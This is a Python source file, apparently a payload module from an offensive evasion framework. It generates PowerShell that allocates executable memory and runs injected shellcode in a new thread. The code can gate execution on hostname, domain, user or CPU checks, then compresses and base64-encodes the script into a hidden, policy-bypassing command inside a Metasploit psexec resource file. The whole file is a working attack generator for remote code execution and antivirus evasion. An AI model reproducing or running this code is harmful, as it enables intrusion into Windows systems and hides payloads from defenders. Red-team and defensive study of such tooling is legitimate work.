"""

Powershell method to inject inline shellcode.
Builds a metasploit .rc resource file to psexec the powershell command easily

Original concept from Matthew Graeber: http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html

Note: the architecture independent invoker was developed independently from
    https://www.trustedsec.com/may-2013/native-powershell-x86-shellcode-injection-on-64-bit-platforms/

Port to the msf resource file by @harmj0y

"""


from Tools.Evasion.evasion_common import evasion_helpers
from Tools.Evasion.evasion_common import shellcode_help


class PayloadModule:

    def __init__(self, cli_obj):
        # required
        self.description = "PowerShell VirtualAlloc method for inline shellcode injection that makes a Metasploit psexec_command .rc script"
        self.rating = "Excellent"
        self.language = "powershell"
        self.extension = "rc"
        self.name = "PowerShell psexec_command stager"
        self.path = "powershell/shellcode_inject/psexec_virtual"
        self.cli_opts = cli_obj
        self.shellcode = shellcode_help.Shellcode(cli_obj)
        self.payload_source_code = ''
        if cli_obj.ordnance_payload is not None:
            self.payload_type = cli_obj.ordnance_payload
        elif cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''
        self.cli_shellcode = False

        # options we require user ineraction for- format is {Option : [Value, Description]]}
        self.required_options = {
            "INJECT_METHOD"  : ["Virtual", "Virtual, Void, or Heap"],
            "HOSTNAME"       : ["X", "Optional: Required system hostname"],
            "DOMAIN"         : ["X", "Optional: Required internal domain"],
            "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
            "USERNAME"       : ["X", "Optional: The required user account"]
        }

    def psRaw(self):

        checks, num_ends = self.system_checks()
        # Generate the shellcode
        if not self.cli_shellcode:
            Shellcode = self.shellcode.generate(self.cli_opts)
            if self.shellcode.msfvenompayload:
                self.payload_type = self.shellcode.msfvenompayload
            elif self.shellcode.payload_choice:
                self.payload_type = self.shellcode.payload_choice
                self.shellcode.payload_choice = ''
            # assume custom shellcode
            else:
                self.payload_type = 'custom'
        else:
            Shellcode = self.cli_shellcode
        Shellcode = ",0".join(Shellcode.split("\\"))[1:]

        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            baseString = """$c = @"
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr w, uint x, uint y, uint z);
[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr u, uint v, IntPtr w, IntPtr x, uint y, IntPtr z);
[DllImport("msvcrt.dll")] public static extern IntPtr memset(IntPtr x, uint y, uint z);
"@\n"""
            baseString += checks
            baseString += """$o = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru
$x=$o::VirtualAlloc(0,0x1000,0x3000,0x40); [Byte[]]$sc = %s;
for ($i=0;$i -le ($sc.Length-1);$i++) {$o::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1) | out-null;}
$z=$o::CreateThread(0,0,$x,0,0,0); Start-Sleep -Second 100000""" % (Shellcode)

        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
            baseString = """$c = @"
[DllImport("kernel32.dll")] public static extern IntPtr HeapCreate(uint x, uint y, uint z);
[DllImport("kernel32.dll")] public static extern IntPtr HeapAlloc(IntPtr w, uint x, uint y);
[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr u, uint v, IntPtr w, IntPtr x, uint y, IntPtr z);
[DllImport("msvcrt.dll")] public static extern IntPtr memset(IntPtr x, uint y, uint z);
"@\n"""
            baseString += checks
            baseString += """$o = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru
[Byte[]]$sc = %s
$x=$o::HeapCreate(0x00040000,$sc.Length,0); $ct=$o::HeapAlloc($x,0x00000008,$sc.Length)
for ($i=0;$i -le ($sc.Length-1);$i++) {$o::memset([IntPtr]($ct.ToInt32()+$i), $sc[$i], 1) | out-null;}
$z=$o::CreateThread(0,0,$ct,0,0,0); Start-Sleep -Second 100000""" % (Shellcode)

        baseString += '}\n' * num_ends

        return baseString

    def system_checks(self):
        check_code = ''
        num_ends_required = 0

        if self.required_options["HOSTNAME"][0].lower() != "x":
            check_code += "if($env:computername -eq \"" + self.required_options["HOSTNAME"][0].lower() + "\"{\n"
            num_ends_required += 1

        if self.required_options["DOMAIN"][0].lower() != "x":
            check_code += "if((Get-WMIObject -Class Win32_ComputerSystem).Domain -eq \"" + self.required_options["DOMAIN"][0].lower() + "\"{\n"
            num_ends_required += 1

        if self.required_options["USERNAME"][0].lower() != "x":
            check_code += "if($env:username -eq \"" + self.required_options["USERNAME"][0].lower() + "\"{\n"
            num_ends_required += 1

        if self.required_options["PROCESSORS"][0].lower() != "x":
            check_code += "if((Get-WMIObject -Class Win32_Processor).NumberOfLogicalProcessors -ge " + self.required_options["PROCESSORS"][0].lower() + "{\n"
            num_ends_required += 1

        return check_code, num_ends_required

    def generate(self):

        encoded = evasion_helpers.deflate(self.psRaw())

        payload_code = "use auxiliary/admin/smb/psexec_command\n"
        payload_code += "set COMMAND "
        payload_code += "if %PROCESSOR_ARCHITECTURE%==x86 ("
        payload_code += "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \\\"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\\\\\"%s\\\\\\\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\\\"" % (encoded)
        payload_code += ") else ("
        payload_code += "%%WinDir%%\\\\syswow64\\\\windowspowershell\\\\v1.0\\\\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \\\"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\\\\\"%s\\\\\\\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\\\")" % (encoded)

        self.payload_source_code = payload_code
        return
